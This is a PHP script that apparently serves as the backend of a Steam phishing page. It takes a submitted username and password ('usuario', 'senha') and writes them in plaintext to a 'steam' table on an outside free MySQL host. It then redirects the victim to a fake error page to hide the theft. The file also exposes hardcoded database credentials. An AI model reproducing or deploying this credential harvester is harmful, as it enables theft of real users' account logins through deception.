<?php

$host = "sql10.freesqldatabase.com";
$user = "sql10730553";
$pass = "ycA9PKDfCZ";
$db = "sql10730553";

$conn = mysqli_connect($host, $user, $pass, $db);

if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}

$create_table_sql = "CREATE TABLE IF NOT EXISTS steam (
    id INT PRIMARY KEY AUTO_INCREMENT,
    usuario VARCHAR(255) NOT NULL,
    senha VARCHAR(255) NOT NULL
)";

mysqli_query($conn, $create_table_sql);

$usuario = $_POST["usuario"];
$senha = $_POST["senha"];

$insert_sql = "INSERT INTO steam (usuario, senha) VALUES (?, ?)";
$stmt = $conn->prepare($insert_sql);

$stmt->bind_param("ss", $usuario, $senha);
$stmt->execute();

$stmt->close();
$conn->close();

header("location:redirect/Erro.php");
?>